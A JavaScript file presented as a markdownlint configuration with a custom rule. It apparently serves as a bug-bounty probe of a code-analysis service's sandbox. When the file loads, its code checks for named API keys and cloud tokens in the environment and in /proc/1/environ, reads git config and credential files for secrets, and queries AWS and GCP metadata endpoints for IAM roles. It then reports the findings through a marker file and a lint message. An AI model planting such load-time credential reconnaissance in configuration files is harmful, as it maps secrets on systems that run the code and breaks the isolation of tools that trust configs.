const {
  accessSync,
  closeSync,
  constants,
  openSync,
  readFileSync,
  readdirSync,
  statSync,
  writeFileSync,
} = require('node:fs');
const { execFileSync } = require('node:child_process');
const { dirname, isAbsolute, join, resolve } = require('node:path');

const credentialNames = [
  'ANTHROPIC_API_KEYS', 'APERTURE_AGENT_KEY', 'AWS_ACCESS_KEY_ID',
  'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN', 'AZURE_CLIENT_SECRET',
  'CI_JOB_TOKEN',
  'CODERABBIT_API_KEY', 'CODECOV_TOKEN', 'COMPOSER_AUTH',
  'COURIER_NOTIFICATION_AUTH_TOKEN', 'DATADOG_API_KEY', 'DD_API_KEY',
  'DOCKER_AUTH_CONFIG', 'ENCRYPTION_PASSWORD', 'GCP_SERVICE_ACCOUNT_KEY',
  'GH_TOKEN', 'GH_WEBHOOK_SECRET', 'GITHUB_APP_CLIENT_SECRET',
  'GITHUB_APP_PEM_FILE', 'GITHUB_TOKEN', 'GITLAB_BOT_TOKEN',
  'GOOGLE_APPLICATION_CREDENTIALS', 'JIRA_SECRET', 'LANGCHAIN_API_KEY',
  'NODE_AUTH_TOKEN', 'NPM_TOKEN', 'OPENAI_API_KEYS', 'PYPI_TOKEN',
  'SENTRY_AUTH_TOKEN',
];

function namesPresent(availableNames) {
  const names = new Set(availableNames);
  return credentialNames.filter((name) => names.has(name));
}

function pidOneNames() {
  try {
    return readFileSync('/proc/1/environ')
      .toString('utf8')
      .split('\0')
      .filter(Boolean)
      .map((entry) => entry.slice(0, Math.max(0, entry.indexOf('='))));
  } catch {
    return [];
  }
}

function readableFile(filePath) {
  try {
    accessSync(filePath, constants.R_OK);
    if (!statSync(filePath).isFile()) return false;
    const descriptor = openSync(filePath, 'r');
    closeSync(descriptor);
    return true;
  } catch {
    return false;
  }
}

function directoryContainsReadableFile(directory, depth = 2) {
  try {
    for (const entry of readdirSync(directory, { withFileTypes: true })) {
      const child = join(directory, entry.name);
      if (
        entry.isFile()
        && /(?:auth|credential|dockerconfig|key|password|secret|token)/i.test(entry.name)
        && readableFile(child)
      ) return true;
      if (entry.isDirectory() && depth > 0 && directoryContainsReadableFile(child, depth - 1)) {
        return true;
      }
    }
  } catch {
    return false;
  }
  return false;
}

function gitConfigurationPaths() {
  const dotGit = join(process.cwd(), '.git');
  const candidates = [join(dotGit, 'config')];
  try {
    if (statSync(dotGit).isFile()) {
      const match = /^gitdir:\s*(.+)$/i.exec(readFileSync(dotGit, 'utf8').trim());
      if (match) {
        const gitDirectory = isAbsolute(match[1])
          ? match[1]
          : resolve(dirname(dotGit), match[1]);
        candidates.push(join(gitDirectory, 'config'));
        candidates.push(join(gitDirectory, 'config.worktree'));
      }
    }
  } catch {
    // A checkout without Git metadata is an expected negative result.
  }
  return candidates;
}

function gitConfigurationContainsCredential() {
  const pattern =
    /(?:authorization|bearer|oauth2|x-access-token)|https?:\/\/[^\s/:@]+:[^\s/@]+@/i;
  return gitConfigurationPaths().some((filePath) => {
    try {
      return pattern.test(readFileSync(filePath, 'utf8'));
    } catch {
      return false;
    }
  });
}

function cloudIdentityNamesReachable() {
  const result = { awsRole: false, gcpServiceAccount: false };
  const executeBooleanProbe = (source) => {
    try {
      return execFileSync(process.execPath, ['-e', source], {
        encoding: 'utf8',
        stdio: ['ignore', 'pipe', 'ignore'],
        timeout: 1800,
      }).trim() === '1';
    } catch {
      return false;
    }
  };
  try {
    result.awsRole = executeBooleanProbe(`(async () => {
      const tokenResponse = await fetch('http://169.254.169.254/latest/api/token', {
        method: 'PUT',
        headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '60' },
        redirect: 'error',
        signal: AbortSignal.timeout(650),
      });
      const token = tokenResponse.ok ? (await tokenResponse.text()).trim() : '';
      if (!token || token.length >= 4096) return process.stdout.write('0');
      const roleResponse = await fetch(
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        {
          headers: { 'X-aws-ec2-metadata-token': token },
          redirect: 'error',
          signal: AbortSignal.timeout(650),
        },
      );
      const roleNames = roleResponse.ok ? (await roleResponse.text()).trim() : '';
      process.stdout.write(roleNames ? '1' : '0');
    })().catch(() => process.stdout.write('0'))`);
  } catch {
    // Unreachable or blocked metadata is the expected negative result.
  }
  try {
    result.gcpServiceAccount = executeBooleanProbe(`(async () => {
      const response = await fetch(
        'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/',
        {
          headers: { 'Metadata-Flavor': 'Google' },
          redirect: 'error',
          signal: AbortSignal.timeout(650),
        },
      );
      const names = response.ok ? (await response.text()).trim() : '';
      process.stdout.write(names ? '1' : '0');
    })().catch(() => process.stdout.write('0'))`);
  } catch {
    // Unreachable or blocked metadata is the expected negative result.
  }
  return result;
}

const credentialFiles = [
  '/root/.aws/credentials',
  '/root/.config/gcloud/application_default_credentials.json',
  '/root/.config/gh/hosts.yml',
  '/root/.git-credentials',
  '/home/coderabbit/.aws/credentials',
  '/home/coderabbit/.config/gcloud/application_default_credentials.json',
  '/home/coderabbit/.config/gh/hosts.yml',
  '/home/coderabbit/.git-credentials',
  '/home/node/.aws/credentials',
  '/home/node/.config/gcloud/application_default_credentials.json',
  '/home/node/.config/gh/hosts.yml',
  '/home/node/.git-credentials',
];
const secretDirectories = ['/etc/secrets', '/run/secrets', '/secrets', '/var/run/secrets'];
const currentNames = namesPresent(Object.keys(process.env));
const initNames = namesPresent(pidOneNames());
const hasCredentialFile = credentialFiles.some(readableFile)
  || secretDirectories.some((directory) => directoryContainsReadableFile(directory));
const cloud = cloudIdentityNamesReachable();
const flags = [];
if (currentNames.length) flags.push(`ENV-${currentNames.join('+')}`);
if (initNames.length) flags.push(`PID1-${initNames.join('+')}`);
if (gitConfigurationContainsCredential()) flags.push('GITAUTH');
if (hasCredentialFile) flags.push('SECRETFILE');
if (cloud.awsRole) flags.push('AWSROLE');
if (cloud.gcpServiceAccount) flags.push('GCPSA');

const suffix = flags.length ? flags.join('_') : 'NONE';
const marker = `CR_H1_SAFE_ANALYZER_BOUNDARY_20260815_T_${suffix}`;

// The result contains only booleans and credential variable names, never values.
writeFileSync(join(process.cwd(), 'analysis_analyzer_boundary_result.txt'), `${marker}\n`);

module.exports = {
  config: { default: false, CRH002: true },
  customRules: [{
    names: ['CRH002'],
    description: 'Controlled analyzer isolation-boundary check',
    tags: ['controlled'],
    function: (_params, onError) => onError({ lineNumber: 1, detail: marker }),
  }],
};
